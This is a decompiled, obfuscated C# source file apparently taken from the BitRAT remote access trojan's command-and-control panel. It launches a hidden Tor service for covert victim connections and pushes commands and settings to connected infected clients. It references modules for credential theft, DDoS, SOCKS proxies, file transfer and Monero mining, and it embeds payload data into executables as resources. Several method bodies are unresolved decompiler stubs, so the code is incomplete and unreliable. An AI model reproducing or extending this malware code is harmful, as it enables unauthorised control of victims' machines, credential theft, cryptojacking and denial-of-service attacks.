﻿using BitRAT;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Operators;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Prng;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using Org.BouncyCastle.X509.Extension;
using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class Class136
{
    private static Random random_0;
    private static StaticLocalInitFlag staticLocalInitFlag_0;

    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    private static extern IntPtr BeginUpdateResource(string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    private static extern bool EndUpdateResource(IntPtr intptr_0, bool bool_0);
    [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern long FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    internal static extern int GetTickCount();
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    internal static extern long GetTickCount64();
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    internal static extern bool GetVersionExA(ref Struct27 struct27_0);
    [DllImport("User32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern long SetForeGroundWindow(long long_0);
    [DllImport("User32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern int ShowWindow(IntPtr intptr_0, int int_0);
    public static X509Certificate2 smethod_0(string string_0, string string_1, int int_0)
    {
        SecureRandom random = new SecureRandom(new CryptoApiRandomGenerator());
        RsaKeyPairGenerator generator1 = new RsaKeyPairGenerator();
        generator1.Init(new KeyGenerationParameters(random, int_0));
        AsymmetricCipherKeyPair pair = generator1.GenerateKeyPair();
        X509Name subject = new X509Name("CN=" + string_0);
        BigInteger serialNumber = BigInteger.ProbablePrime(120, random);
        DateTime date = DateTime.UtcNow.Date;
        X509V3CertificateGenerator generator2 = new X509V3CertificateGenerator();
        generator2.SetSerialNumber(serialNumber);
        generator2.SetSubjectDN(subject);
        generator2.SetIssuerDN(subject);
        generator2.SetNotBefore(date);
        generator2.SetNotAfter(date.AddYears(0x63));
        generator2.SetPublicKey(pair.Public);
        generator2.AddExtension(X509Extensions.SubjectKeyIdentifier, false, new SubjectKeyIdentifierStructure(pair.Public));
        generator2.AddExtension(X509Extensions.BasicConstraints, true, new BasicConstraints(true));
        X509Certificate2 certificate1 = new X509Certificate2(DotNetUtilities.ToX509Certificate(generator2.Generate(new Asn1SignatureFactory(string_1, pair.Private, random))));
        certificate1.PrivateKey = DotNetUtilities.ToRSA(pair.Private as RsaPrivateCrtKeyParameters);
        return certificate1;
    }

    public static void smethod_1()
    {
        Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9m*?64D", null);
    }

    public static unsafe int smethod_10(string string_0, int int_0)
    {
        int num3;
        char[] separator = new char[] { '\n' };
        string[] source = string_0.Split(separator);
        int index = 0;
        int num2 = 0;
        char[] chArray = new char[] { ' ' };
        int num4 = Enumerable.Count<string>(source) - 1;
        index = 0;
        while (true)
        {
            string[] strArray;
            if (index > num4)
            {
                source = null;
                strArray = null;
                num3 = 0;
                break;
            }
            string str = source[index].Trim();
            if (!string.IsNullOrEmpty(str) && ((index > 3) && str.StartsWith("TCP")))
            {
                Struct28[] structArray;
                strArray = str.Split(chArray, StringSplitOptions.RemoveEmptyEntries);
                Struct28* structPtr1 = &(((Struct28[]) Utils.CopyArray(structArray, new Struct28[num2 + 1]))[num2]);
                structPtr1->int_0 = Conversions.ToInteger(strArray[1].Substring(strArray[1].LastIndexOf(":") + 1));
                if (Conversion.Val(structPtr1->int_0) == int_0)
                {
                    num3 = Conversions.ToInteger(strArray[4]);
                    break;
                }
                num2++;
            }
            index++;
        }
        return num3;
    }

    public static void smethod_11(int int_0)
    {
        int processId = smethod_10(smethod_9("netstat", "-aon"), int_0);
        if (processId > 0)
        {
            Process.GetProcessById(processId).Kill();
        }
    }

    public static void smethod_12()
    {
        if (Class130.fTorConfig_0.InvokeRequired)
        {
            Class130.fTorConfig_0.Invoke(new Delegate110(Class136.smethod_12), new object[0]);
        }
        else
        {
            string path = Application.StartupPath + @"\data\tor\html";
            string str2 = Application.StartupPath + @"\data\tor\data";
            string str3 = "\"" + Application.StartupPath + "\\data\\tor\\torrc-srv\"";
            Class130.fTorConfig_0.method_2("Starting Tor process. Please wait...", false);
            smethod_11(0xd427);
            string left = Conversions.ToString(Operators.ConcatenateObject(Conversions.ToString(Operators.ConcatenateObject(Conversions.ToString(Operators.ConcatenateObject(((((Conversions.ToString(Operators.ConcatenateObject("SOCKSPort 54311\r\n", Operators.ConcatenateObject(Operators.ConcatenateObject("DirCache ", Interaction.IIf(Class135.smethod_0().TorDisableCaching, "0", "1")), "\r\n"))) + "HiddenServiceDir " + path + "\r\n") + "DataDirectory " + str2 + "\r\n") + "HiddenServicePort 80 127.0.0.1:" + Conversions.ToString(Class135.smethod_0().PortTor) + "\r\n") + "HiddenServiceVersion 3\r\n") + "DoSCircuitCreationEnabled 0\r\n" + "DoSCircuitCreationMinConnections 54311\r\n", Operators.ConcatenateObject(Operators.ConcatenateObject("DoSRefuseSingleHopClientRendezvous ", Interaction.IIf(Class135.smethod_0().TorRejectSingleHop, "1", "0")), "\r\n"))) + "HiddenServiceMaxStreams 0\r\n", Operators.ConcatenateObject(Operators.ConcatenateObject("NoExec ", Interaction.IIf(Class135.smethod_0().TorNoExec, "1", "0")), "\r\n"))), Operators.ConcatenateObject(Operators.ConcatenateObject("ConstrainedSockets ", Interaction.IIf(Class135.smethod_0().TorUseConstrainedSockets, "1", "0")), "\r\n")));
            if (Class135.smethod_0().TorUseConstrainedSockets)
            {
                left = left + "ConstrainedSockSize " + Class135.smethod_0().TorConstrainedSocketSize + "\r\n";
            }
            left = Conversions.ToString(Operators.ConcatenateObject(left, Operators.ConcatenateObject("AvoidDiskWrites ", Interaction.IIf(Class135.smethod_0().TorAvoidDiskWrites, "1", "0"))));
            if (left.EndsWith("\r\n"))
            {
                left = left.Remove(left.LastIndexOf("\r\n"));
            }
            Class142 class2 = new Class142();
            class2.string_0 = Application.StartupPath + @"\data\tor\torrc-srv";
            class2.byte_0 = Encoding.UTF8.GetBytes(left);
            class2.bool_0 = false;
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            if (!Directory.Exists(str2))
            {
                Directory.CreateDirectory(str2);
            }
            else
            {
                string[] directories = Directory.GetDirectories(str2);
                int index = 0;
                while (true)
                {
                    if (index >= directories.Length)
                    {
                        foreach (string str7 in Directory.GetFiles(str2))
                        {
                            File.Delete(str7);
                        }
                        break;
                    }
                    string str6 = directories[index];
                    Directory.Delete(str6, true);
                    index++;
                }
            }
            Class130.process_0 = new Process();
            Class130.process_0.StartInfo.FileName = Application.StartupPath + @"\data\tor\tor.exe";
            Class130.process_0.StartInfo.Arguments = "-f " + str3;
            Class130.process_0.StartInfo.WorkingDirectory = Application.StartupPath + @"\data\tor\";
            Class130.process_0.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            Class130.process_0.StartInfo.CreateNoWindow = true;
            Class130.process_0.Start();
            Struct27 struct2 = new Struct27();
            struct2.int_0 = Marshal.SizeOf(typeof(Struct27));
            bool flag2 = false;
            if (GetVersionExA(ref struct2) && (struct2.int_1 >= 6))
            {
                flag2 = true;
            }
            long num3 = !flag2 ? ((long) GetTickCount()) : GetTickCount64();
            long num4 = num3;
            if (!File.Exists(Application.StartupPath + @"\data\tor\html\hostname"))
            {
                while (true)
                {
                    if (!File.Exists(Application.StartupPath + @"\data\tor\html\hostname"))
                    {
                        struct2 = new Struct27();
                        struct2.int_0 = Marshal.SizeOf(typeof(Struct27));
                        flag2 = false;
                        if (GetVersionExA(ref struct2) && (struct2.int_1 >= 6))
                        {
                            flag2 = true;
                        }
                        num3 = !flag2 ? ((long) GetTickCount()) : GetTickCount64();
                        if ((num3 - num4) > 0x15f90L)
                        {
                            Class130.fTorConfig_0.method_2("Failed to create a hostname!", true);
                            Interaction.MsgBox("Failed to create a hostname!", MsgBoxStyle.Critical, Application.ProductName);
                            return;
                        }
                        else
                        {
                            Thread.Sleep(1);
                        }
                        continue;
                    }
                    else
                    {
                        Class130.fTorConfig_0.vmethod_18().Text = Strings.Replace(smethod_14(ref Application.StartupPath + @"\data\tor\html\hostname"), "\r\n", string.Empty, 1, -1, CompareMethod.Text);
                        Class130.fTorConfig_0.vmethod_18().Enabled = true;
                        Class130.fTorConfig_0.vmethod_28().Enabled = true;
                    }
                    break;
                }
            }
            struct2 = new Struct27();
            struct2.int_0 = Marshal.SizeOf(typeof(Struct27));
            flag2 = false;
            if (GetVersionExA(ref struct2) && (struct2.int_1 >= 6))
            {
                flag2 = true;
            }
            num3 = !flag2 ? ((long) GetTickCount()) : GetTickCount64();
            num4 = num3;
            while (!Class130.process_0.HasExited)
            {
                struct2 = new Struct27();
                struct2.int_0 = Marshal.SizeOf(typeof(Struct27));
                flag2 = false;
                if (GetVersionExA(ref struct2) && (struct2.int_1 >= 6))
                {
                    flag2 = true;
                }
                num3 = !flag2 ? ((long) GetTickCount()) : GetTickCount64();
                if ((num3 - num4) > 0x1388L)
                {
                    break;
                }
                Application.DoEvents();
            }
            if (Class130.process_0.HasExited)
            {
                Class130.struct18_3.method_1(false);
                Class130.fTorConfig_0.vmethod_22().Text = "Start";
                Class130.fTorConfig_0.method_2("Tor hidden service failed to start. Already running?", true);
            }
            else
            {
                Class130.fTorConfig_0.method_2("Tor hidden service active with PID " + Conversions.ToString(Class130.process_0.Id), false);
                Class130.fTorConfig_0.method_3("Stop");
                Class130.fTorConfig_0.vmethod_10().Enabled = false;
                if (!Class130.fTorConfig_0.vmethod_20().IsBusy)
                {
                    Class130.fTorConfig_0.vmethod_20().RunWorkerAsync();
                }
                Class130.struct18_3.method_1(true);
            }
        }
    }

    public static string smethod_13(ref string string_0)
    {
        return Convert.ToBase64String(File.ReadAllBytes(string_0));
    }

    public static string smethod_14(ref string string_0)
    {
        return Encoding.UTF8.GetString(File.ReadAllBytes(string_0));
    }

    internal static void smethod_15(ref string string_0, ref byte[] byte_0, bool bool_0)
    {
        if (!Directory.Exists(Path.GetDirectoryName(string_0)))
        {
            Directory.CreateDirectory(Path.GetDirectoryName(string_0));
        }
        Class145.smethod_0().FileSystem.WriteAllBytes(string_0, byte_0, bool_0);
    }

    public static long smethod_16(ref string string_0)
    {
        return Conversions.ToLong(Interaction.IIf(File.Exists(string_0), (File.GetLastWriteTimeUtc(string_0) - new DateTime(0x7b2, 1, 1)).TotalSeconds, 0));
    }

    public static void smethod_17(ref string string_0)
    {
        Directory.CreateDirectory(string_0);
    }

    public static Image smethod_18(ref byte[] byte_0)
    {
        return Image.FromStream(new MemoryStream(byte_0));
    }

    public static string smethod_19(int int_0)
    {
        string str;
        switch (int_0)
        {
            case 1:
                str = "Realtime";
                break;

            case 2:
                str = "High";
                break;

            case 3:
                str = "Above normal";
                break;

            case 4:
                str = "Normal";
                break;

            case 5:
                str = "Below normal";
                break;

            case 6:
                str = "Low";
                break;

            default:
                str = "Normal";
                break;
        }
        return str;
    }

    public static void smethod_2(string string_0)
    {
        object[] objArray = new object[] { string_0 };
        Class149.smethod_0().method_139(Class149.smethod_1(), ")&O7u*?7ls", objArray);
    }

    public static int smethod_20(string string_0, char char_0)
    {
        Class141 class2 = new Class141();
        class2.char_0 = char_0;
        return Enumerable.Count<char>(string_0, new Func<char, bool>(class2._Lambda$__0));
    }

    public static string smethod_21(ref string string_0)
    {
        if ((string_0.Length > 0) && (Operators.CompareString(Strings.Right(string_0, 1), @"\", true) == 0))
        {
            string_0 = Strings.Mid(string_0, 1, string_0.Length - 1);
        }
        return Directory.GetParent(string_0).FullName;
    }

    private static void smethod_22(ref string string_0)
    {
        if (Class130.concurrentDictionary_3.Count != 0)
        {
            IEnumerator<KeyValuePair<string, CClient>> enumerator = Class130.concurrentDictionary_3.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ref double numRef;
                KeyValuePair<string, CClient> current = enumerator.Current;
                CClient client = current.Value;
                ref string s = ref string_0;
                ref CClient clientRef = ref client;
                s = s + "@";
                byte[] bytes = Encoding.UTF8.GetBytes(s);
                clientRef.sock_async.method_6(bytes);
                *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
                *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
                *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
            }
        }
    }

    public static void smethod_23(string string_0)
    {
        Class140 class2 = new Class140();
        class2.string_0 = string_0;
        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
    }

    private static void smethod_24()
    {
        if (Class130.concurrentDictionary_3.Count != 0)
        {
            IEnumerator<KeyValuePair<string, CClient>> enumerator = Class130.concurrentDictionary_3.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ref double numRef;
                KeyValuePair<string, CClient> current = enumerator.Current;
                CClient client = current.Value;
                string[] textArray1 = new string[11];
                textArray1[0] = "settings|";
                textArray1[1] = current.Value.sKey;
                textArray1[2] = "|";
                textArray1[3] = Conversions.ToString(Class135.smethod_0().TransfersRecvBytes);
                textArray1[4] = "|";
                textArray1[5] = Conversions.ToString(Class135.smethod_0().TransfersSendBytes);
                textArray1[6] = "|";
                textArray1[7] = Conversions.ToString(Class135.smethod_0().TransfersConcurrentMax);
                textArray1[8] = "|";
                textArray1[9] = Conversions.ToString(Class135.smethod_0().MaxBandwidthRateIn);
                textArray1[10] = "|";
                string str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(textArray1), Interaction.IIf(Class135.smethod_0().TransferReplaceExisting, "1", "0")), "|"), Interaction.IIf(Class135.smethod_0().TransferReplaceFilesModified, "1", "0")));
                ref string s = ref str;
                ref CClient clientRef = ref client;
                s = s + "@";
                byte[] bytes = Encoding.UTF8.GetBytes(s);
                clientRef.sock_async.method_6(bytes);
                *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
                *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
                *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
            }
        }
    }

    private static void smethod_25(bool bool_0)
    {
        if (Class130.concurrentDictionary_3.Count != 0)
        {
            IEnumerator<KeyValuePair<string, CClient>> enumerator = Class130.concurrentDictionary_3.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ref double numRef;
                KeyValuePair<string, CClient> current = enumerator.Current;
                CClient client = current.Value;
                string str = Conversions.ToString(Operators.ConcatenateObject(Interaction.IIf(bool_0, "thumb_start", "thumb_stop"), "|1"));
                ref string s = ref str;
                ref CClient clientRef = ref client;
                s = s + "@";
                byte[] bytes = Encoding.UTF8.GetBytes(s);
                clientRef.sock_async.method_6(bytes);
                *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
                *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
                *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
            }
        }
    }

    public static string smethod_26(ref string string_0)
    {
        StringBuilder builder = new StringBuilder(string_0.Length / 2);
        int num = string_0.Length - 2;
        for (int i = 0; i <= num; i += 2)
        {
            builder.Append(Strings.Chr(Convert.ToByte(string_0.Substring(i, 2), 0x10)));
        }
        return builder.ToString();
    }

    public static byte[] smethod_27(ref string string_0)
    {
        return Encoding.UTF8.GetBytes(string_0);
    }

    public static string smethod_28(ref string string_0)
    {
        object[] objArray = new object[] { string_0 };
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O5f*?76a", objArray);
    }

    public static string smethod_29(ref string string_0)
    {
        StringBuilder builder = new StringBuilder();
        byte[] buffer = MD5.Create().ComputeHash(File.ReadAllBytes(string_0));
        int num2 = buffer.Length - 1;
        for (int i = 0; i <= num2; i++)
        {
            builder.Append(buffer[i].ToString("X2"));
        }
        return builder.ToString().ToLower();
    }

    public static string[] smethod_3(string[] string_0)
    {
        ArrayList list = new ArrayList();
        int num = string_0.Length - 1;
        for (int i = 0; i <= num; i++)
        {
            if (!list.Contains(string_0[i].Trim()))
            {
                list.Add(string_0[i].Trim());
            }
        }
        string[] array = new string[(list.Count - 1) + 1];
        list.CopyTo(array);
        return array;
    }

    public static unsafe uint smethod_30(string string_0)
    {
        object[] objArray = new object[] { string_0 };
        return *(((uint*) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O5`*?8E-", objArray)));
    }

    public static bool smethod_31(ref Collection collection_0, ref string string_0)
    {
        bool flag;
        int num2;
        ProjectData.ClearProjectError();
        if (Operators.ConditionalCompareObjectEqual(collection_0[string_0], null, true))
        {
            flag = false;
        }
        else
        {
            flag = Information.Err().Number == 0;
            Information.Err().Clear();
        }
        if (num2 != 0)
        {
            ProjectData.ClearProjectError();
        }
        return flag;
    }

    public static long smethod_32(ref string string_0)
    {
        int num3;
        ProjectData.ClearProjectError();
        long length = new FileInfo(string_0).Length;
        if (num3 != 0)
        {
            ProjectData.ClearProjectError();
        }
        return length;
    }

    public static string smethod_33(string string_0, string string_1, bool bool_0)
    {
        // Unresolved stack state at '00000000'
    }

    public static string smethod_34(ref string string_0)
    {
        UTF8Encoding encoding1 = new UTF8Encoding(true);
        return encoding1.GetString(encoding1.GetBytes(string_0));
    }

    public static string smethod_35(long long_0, bool bool_0)
    {
        // Unresolved stack state at '00000000'
    }

    public static long smethod_36()
    {
        return (long) Math.Round((DateTime.UtcNow - new DateTime(0x7b2, 1, 1)).TotalMilliseconds);
    }

    public static long smethod_37()
    {
        return (long) ((int) Math.Round((DateTime.UtcNow - new DateTime(0x7b2, 1, 1, 0, 0, 0)).TotalHours));
    }

    public static string smethod_38(long long_0)
    {
        // Unresolved stack state at '00000000'
    }

    public static unsafe bool smethod_39(string string_0)
    {
        object[] objArray = new object[] { string_0 };
        return *(((bool*) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O9<*?9DI", objArray)));
    }

    public static object smethod_4(string string_0)
    {
        IEnumerator<KeyValuePair<string, cFWIP>> enumerator = Class130.concurrentDictionary_9.GetEnumerator();
        while (true)
        {
            object obj2;
            if (!enumerator.MoveNext())
            {
                obj2 = false;
            }
            else
            {
                KeyValuePair<string, cFWIP> current = enumerator.Current;
                if (Strings.InStr(current.Value.IP, "*", CompareMethod.Text) == 0)
                {
                    if (Operators.CompareString(current.Value.IP, string_0, true) != 0)
                    {
                        continue;
                    }
                    current.Value.ATTEMPTS = Conversions.ToString((double) (Conversion.Val(current.Value.ATTEMPTS) + 1.0));
                    Class130.concurrentQueue_1.Enqueue(current.Value);
                    obj2 = true;
                }
                else
                {
                    Strings.Replace(current.Value.IP, "*", string.Empty, 1, -1, CompareMethod.Text);
                    if (Strings.InStr(string_0, Strings.Replace(current.Value.IP, "*", string.Empty, 1, -1, CompareMethod.Text), CompareMethod.Text) <= 0)
                    {
                        continue;
                    }
                    current.Value.ATTEMPTS = Conversions.ToString((double) (Conversion.Val(current.Value.ATTEMPTS) + 1.0));
                    Class130.concurrentQueue_1.Enqueue(current.Value);
                    obj2 = true;
                }
            }
            return obj2;
        }
    }

    public static string smethod_40(string string_0)
    {
        string str = string.Empty;
        int num = string_0.Length - 1;
        for (int i = 0; i <= num; i++)
        {
            int num3 = Strings.Asc(string_0.Substring(i, 1));
            str = str + num3.ToString("x").ToUpper();
        }
        return str;
    }

    public static string smethod_41()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O8E*?8T2", null);
    }

    private static string smethod_42()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O9:*?:Lh", null);
    }

    private static string smethod_43()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O:&*?9qX", null);
    }

    public static string smethod_44()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O:@*?;d7", null);
    }

    private static string smethod_45()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O8q*?;7(", null);
    }

    private static string smethod_46()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O7t*?<]Q", null);
    }

    private static string smethod_47()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O8>*?<?G", null);
    }

    private static string smethod_48()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O8+*?<$>", null);
    }

    private static string smethod_49(string string_0, string[] string_1)
    {
        object[] objArray = new object[] { string_0, string_1 };
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O6Z*?:Ff", objArray);
    }

    public static bool smethod_5(string string_0)
    {
        string extension = Path.GetExtension(string_0);
        return (((((((Operators.CompareString(extension, ".jpg", true) == 0) | (Operators.CompareString(extension, ".jpeg", true) == 0)) | (Operators.CompareString(extension, ".gif", true) == 0)) | (Operators.CompareString(extension, ".png", true) == 0)) | (Operators.CompareString(extension, ".bmp", true) == 0)) | (Operators.CompareString(extension, ".tiff", true) == 0)) | (Operators.CompareString(extension, ".svg", true) == 0));
    }

    public static string smethod_50(ref object object_0)
    {
        object[] objArray = new object[] { object_0 };
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), @")&O7E*?:(\", objArray);
    }

    private static string smethod_51(ref IList<byte> ilist_0)
    {
        object[] objArray = new object[] { ilist_0 };
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O5d*?9qX", objArray);
    }

    public static string smethod_52()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O:'*?=bo", null);
    }

    public static string smethod_53()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O9Z*?=>c", null);
    }

    public static bool smethod_54(string string_0)
    {
        string text1 = Encoding.UTF8.GetString(File.ReadAllBytes(string_0));
        return Conversions.ToBoolean(Interaction.IIf(Operators.CompareString(text1.Substring(Strings.InStr(text1, "PE\0\0", CompareMethod.Text) + 3, 1).ToLower(), "l", true) == 0, false, true));
    }

    public static bool smethod_55(string string_0, string string_1, byte[] byte_0)
    {
        byte[] buffer = byte_0;
        IntPtr ptr = smethod_56(buffer);
        IntPtr ptr1 = BeginUpdateResource(string_0, false);
        UpdateResource(ptr1, "RCData", string_1, 0x409, ptr, buffer.Length);
        EndUpdateResource(ptr1, false);
        return true;
    }

    private static IntPtr smethod_56(object object_0)
    {
        return GCHandle.Alloc(object_0, GCHandleType.Pinned).AddrOfPinnedObject();
    }

    public static string smethod_6()
    {
        return (string) Class149.smethod_0().method_256(Class149.smethod_1(), ")&O9!*?8r<", null);
    }

    public static bool smethod_7(string string_0, int int_0)
    {
        // Unresolved stack state at '00000000'
    }

    public static void smethod_8(bool bool_0)
    {
        Class130.fSettings_0.vmethod_244().GridLines = bool_0;
        Class130.fMain_0.vmethod_18().GridLines = bool_0;
        IEnumerator<KeyValuePair<string, CClient>> enumerator = Class130.concurrentDictionary_3.GetEnumerator();
        while (enumerator.MoveNext())
        {
            KeyValuePair<string, CClient> current = enumerator.Current;
            if (current.Value.fDB != null)
            {
                current.Value.fDB.vmethod_316().GridLines = bool_0;
                current.Value.fDB.vmethod_718().GridLines = bool_0;
                current.Value.fDB.vmethod_418().GridLines = bool_0;
                current.Value.fDB.vmethod_76().GridLines = bool_0;
                current.Value.fDB.vmethod_720().GridLines = bool_0;
                current.Value.fDB.vmethod_552().GridLines = bool_0;
                current.Value.fDB.vmethod_388().GridLines = bool_0;
                current.Value.fDB.vmethod_78().GridLines = bool_0;
                current.Value.fDB.vmethod_578().GridLines = bool_0;
                current.Value.fDB.vmethod_550().GridLines = bool_0;
                current.Value.fDB.vmethod_624().GridLines = bool_0;
                if (current.Value.fSrch != null)
                {
                    current.Value.fSrch.vmethod_6().GridLines = bool_0;
                }
            }
            Application.DoEvents();
        }
        Class130.fBuilder_0.vmethod_38().GridLines = bool_0;
        Class130.fCredentialsLogins_0.vmethod_52().GridLines = bool_0;
        Class130.fCredentialsLogins_0.vmethod_10().GridLines = bool_0;
        Class130.fDDOS_0.vmethod_38().GridLines = bool_0;
        Class130.fOnJoin_0.vmethod_8().GridLines = bool_0;
        Class130.fSocks4R_0.vmethod_48().GridLines = bool_0;
        Class130.fSocks5_0.vmethod_20().GridLines = bool_0;
        Class130.fTransferManager_0.vmethod_20().GridLines = bool_0;
        Class130.fMinerXMR_0.vmethod_22().GridLines = bool_0;
        Class130.fMinerXMRLogManager_0.vmethod_0().GridLines = bool_0;
    }

    public static string smethod_9(string string_0, string string_1)
    {
        Process process = new Process();
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.FileName = string_0;
        process.StartInfo.Arguments = string_1;
        process.Start();
        process.WaitForExit();
        return process.StandardOutput.ReadToEnd();
    }

    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    private static extern bool UpdateResource(IntPtr intptr_0, string string_0, string string_1, ushort ushort_0, IntPtr intptr_1, int int_0);

    internal sealed class Class137
    {
        public bool bool_0;

        internal void _Lambda$__0()
        {
            Class136.smethod_25(this.bool_0);
        }
    }

    internal sealed class Class138
    {
        public string string_0;
        public string string_1;
        public long long_0;

        internal void _Lambda$__0()
        {
            string str;
            ref double numRef;
            CClient client = Class130.concurrentDictionary_3[str = this.string_0];
            long num = this.long_0;
            ref string s = ref this.string_1;
            ref CClient clientRef = ref client;
            ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
            if (num > 0L)
            {
                Thread.Sleep((int) (num * 0xea60L));
            }
            s = s + "@";
            byte[] bytes = Encoding.UTF8.GetBytes(s);
            clientRef.sock_async.method_6(bytes);
            *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
            *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
            *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
            dictionary[str] = client;
        }
    }

    [Serializable]
    internal sealed class Class139
    {
        public static readonly Class136.Class139 class139_0 = new Class136.Class139();
        public static ThreadStart threadStart_0;

        internal void _Lambda$__44-0()
        {
            Class136.smethod_24();
        }
    }

    internal sealed class Class140
    {
        public string string_0;

        internal void _Lambda$__0()
        {
            Class136.smethod_22(ref this.string_0);
        }
    }

    internal sealed class Class141
    {
        public char char_0;

        internal bool _Lambda$__0(char char_1)
        {
            return (char_1 == this.char_0);
        }
    }

    internal sealed class Class142
    {
        public string string_0;
        public byte[] byte_0;
        public bool bool_0;

        internal void _Lambda$__0()
        {
            Class136.smethod_15(ref this.string_0, ref this.byte_0, this.bool_0);
        }
    }

    private delegate void Delegate110();

    [StructLayout(LayoutKind.Sequential)]
    public struct Struct27
    {
        public int int_0;
        public int int_1;
        public int int_2;
        public int int_3;
        public int int_4;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=0x80)]
        public string string_0;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct Struct28
    {
        public string string_0;
        public int int_0;
        public string string_1;
        public int int_1;
        public string string_2;
        public int int_2;
    }
}

